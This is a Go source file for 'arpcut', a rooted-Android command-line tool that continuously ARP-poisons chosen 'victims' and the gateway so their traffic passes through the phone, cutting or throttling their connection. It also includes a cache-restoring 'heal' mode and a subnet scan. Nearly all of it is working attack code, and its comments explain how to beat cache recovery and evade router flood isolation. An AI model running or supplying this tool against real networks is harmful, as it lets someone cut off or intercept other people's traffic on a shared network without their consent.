// arpcut — tiny root ARP tool for BetterCut (Android arm64, run via `su -c`).
//
//	arpcut cut <iface> <gwIP> <gwMAC> <secs> <ip@mac>...
//	    Continuously ARP-poisons each victim <-> gateway so their traffic
//	    transits this phone. secs=0 runs forever (until killed).
//	arpcut heal <iface> <gwIP> <gwMAC> <ip@mac>...
//	    Restores correct ARP caches for each victim <-> gateway so a lifted
//	    cut takes effect immediately instead of waiting for cache timeout.
//	arpcut scan <iface>
//	    One raw ARP sweep of the /24, prints JSON [{"ip","mac"}].
//
// Poisoning uses AF_PACKET/SOCK_DGRAM (kernel supplies the Ethernet header from
// our iface; we write the 28-byte ARP body). We send BOTH an ARP request and a
// gratuitous ARP reply every round, to both the victim and the gateway, at a
// fast interval — different OSes honor different forms, and a short interval
// out-paces cache recovery (the cause of full-speed "bypass" spikes).
//
// This file is Linux-only (AF_PACKET). The portable, unit-tested pieces
// (arpBody, parseVictims, htons, ...) live in arp.go with no build constraint.

//go:build linux

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Re-poison interval. Override with ARPCUT_MS for stubborn targets.
func interval() time.Duration {
	ms := 500
	if v := os.Getenv("ARPCUT_MS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			ms = n
		}
	}
	return time.Duration(ms) * time.Millisecond
}

func openArp() (int, error) {
	return syscall.Socket(syscall.AF_PACKET, syscall.SOCK_DGRAM, int(htons(ethPARP)))
}

func sendArp(fd, ifindex int, dstMac net.HardwareAddr, body []byte) {
	ll := syscall.SockaddrLinklayer{
		Protocol: htons(ethPARP),
		Ifindex:  ifindex,
		Hatype:   arphrdEth,
		Halen:    6,
	}
	copy(ll.Addr[:6], dstMac)
	_ = syscall.Sendto(fd, body, 0, &ll)
}

func doCut(a []string) {
	if len(a) < 5 {
		fmt.Fprintln(os.Stderr, "usage: arpcut cut <iface> <gwIP> <gwMAC> <secs> <ip@mac>...")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		fmt.Fprintf(os.Stderr, "iface %s: %v\n", a[0], err)
		os.Exit(1)
	}
	gwIP := net.ParseIP(a[1])
	gwMac := mustMAC(a[2])
	secs, _ := strconv.Atoi(a[3])
	vs := parseVictims(a[4:])
	if len(vs) == 0 {
		os.Exit(2)
	}

	fd, err := openArp()
	if err != nil {
		fmt.Fprintf(os.Stderr, "socket: %v\n", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)
	me := ifi.HardwareAddr
	fmt.Printf("cutting %d victim(s) <-x-> gw %s (%s) via %s (%s)\n", len(vs), gwIP, gwMac, a[0], me)

	var deadline time.Time
	if secs > 0 {
		deadline = time.Now().Add(time.Duration(secs) * time.Second)
	}
	tick := interval()
	for {
		for _, v := range vs {
			// Poison victim: "gwIP is at me". Request (target=victim) + reply.
			sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, me, gwIP, v.mac, v.ip))
			sendArp(fd, ifi.Index, v.mac, arpBody(arpReply, me, gwIP, v.mac, v.ip))
			if v.both {
				// Poison gateway: "victimIP is at me". Only for throttling — a
				// pure cut skips this so the gateway never sees our MAC own
				// another host's IP (avoids router ARP-flood isolation).
				sendArp(fd, ifi.Index, gwMac, arpBody(arpRequest, me, v.ip, gwMac, gwIP))
				sendArp(fd, ifi.Index, gwMac, arpBody(arpReply, me, v.ip, gwMac, gwIP))
			}
		}
		if secs > 0 && time.Now().After(deadline) {
			return
		}
		time.Sleep(tick)
	}
}

// doHeal restores correct ARP caches after a cut is lifted. Without this, a
// victim (and the gateway) keep the poisoned "<other> is at this-phone" entry
// until it times out on its own — minutes during which its traffic still tries
// to transit this phone.
//
//	heal <iface> <gwIP> <gwMAC> <ip@mac>...
//
// Reliability matters here: MANY stacks IGNORE an unsolicited unicast ARP reply,
// so a per-victim reply alone often fails to un-poison — which is why restores
// "left the network slow". The robust cure is a BROADCAST gratuitous ARP for the
// gateway, sent as BOTH reply and request forms and repeated: it forces every
// device on the segment to relearn gwIP->gwMAC at once, overwriting the poisoned
// entry. We also re-announce each victim's real MAC (broadcast) so the gateway
// and everyone else drop the "victimIP is at this-phone" entry.
func doHeal(a []string) {
	// iface, gwIP, gwMAC are required; victims are OPTIONAL — with none we still
	// broadcast the real gateway mapping, which un-poisons every device on the
	// segment (useful as a blanket "reset" when orphan poisoners hit hosts we no
	// longer track).
	if len(a) < 3 {
		fmt.Fprintln(os.Stderr, "usage: arpcut heal <iface> <gwIP> <gwMAC> [ip@mac...]")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		os.Exit(1)
	}
	gwIP := net.ParseIP(a[1])
	gwMac := mustMAC(a[2])
	vs := parseVictims(a[3:])
	fd, err := openArp()
	if err != nil {
		os.Exit(1)
	}
	defer syscall.Close(fd)
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	for round := 0; round < 10; round++ {
		// Broadcast the REAL gateway mapping to the whole segment — the key step
		// that un-poisons every victim's gwIP entry. Reply + gratuitous request.
		sendArp(fd, ifi.Index, bcast, arpBody(arpReply, gwMac, gwIP, bcast, gwIP))
		sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, gwMac, gwIP, bcast, gwIP))
		for _, v := range vs {
			// Unicast the real gateway mapping to the victim (reply + request)…
			sendArp(fd, ifi.Index, v.mac, arpBody(arpReply, gwMac, gwIP, v.mac, v.ip))
			sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, gwMac, gwIP, v.mac, v.ip))
			// …tell the gateway the real victim mapping…
			sendArp(fd, ifi.Index, gwMac, arpBody(arpReply, v.mac, v.ip, gwMac, gwIP))
			// …and broadcast the victim's real mapping so all relearn it.
			sendArp(fd, ifi.Index, bcast, arpBody(arpReply, v.mac, v.ip, bcast, v.ip))
		}
		time.Sleep(150 * time.Millisecond)
	}
}

func doScan(a []string) {
	if len(a) < 1 {
		fmt.Fprintln(os.Stderr, "usage: arpcut scan <iface>")
		os.Exit(2)
	}
	ifi, err := net.InterfaceByName(a[0])
	if err != nil {
		os.Exit(1)
	}
	var myIP net.IP
	var ipnet *net.IPNet
	addrs, _ := ifi.Addrs()
	for _, ad := range addrs {
		if n, ok := ad.(*net.IPNet); ok && n.IP.To4() != nil {
			myIP, ipnet = n.IP.To4(), n
			break
		}
	}
	if myIP == nil {
		fmt.Println("[]")
		return
	}
	fd, err := openArp()
	if err != nil {
		os.Exit(1)
	}
	defer syscall.Close(fd)
	me := ifi.HardwareAddr
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	// Enumerate the /24 host range and request each.
	mask := ipnet.Mask
	base := myIP.Mask(mask)
	for i := 1; i < 255; i++ {
		ip := make(net.IP, 4)
		copy(ip, base)
		ip[3] = byte(i)
		if ip.Equal(myIP) {
			continue
		}
		sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, me, myIP, bcast, ip))
	}

	// Collect replies for a short window.
	found := map[string]string{}
	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
		&syscall.Timeval{Sec: 2})
	deadline := time.Now().Add(2 * time.Second)
	buf := make([]byte, 128)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil || n < 28 {
			continue
		}
		op := binary.BigEndian.Uint16(buf[6:])
		if op != arpReply {
			continue
		}
		mac := net.HardwareAddr(buf[8:14]).String()
		ip := net.IP(buf[14:18]).String()
		found[ip] = mac
	}
	var sb strings.Builder
	sb.WriteByte('[')
	first := true
	for ip, mac := range found {
		if !first {
			sb.WriteByte(',')
		}
		first = false
		fmt.Fprintf(&sb, `{"ip":"%s","mac":"%s"}`, ip, mac)
	}
	sb.WriteByte(']')
	fmt.Println(sb.String())
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: arpcut scan|cut ...")
		os.Exit(2)
	}
	switch os.Args[1] {
	case "cut":
		doCut(os.Args[2:])
	case "heal":
		doHeal(os.Args[2:])
	case "scan":
		doScan(os.Args[2:])
	default:
		fmt.Fprintln(os.Stderr, "usage: arpcut scan|cut ...")
		os.Exit(2)
	}
}
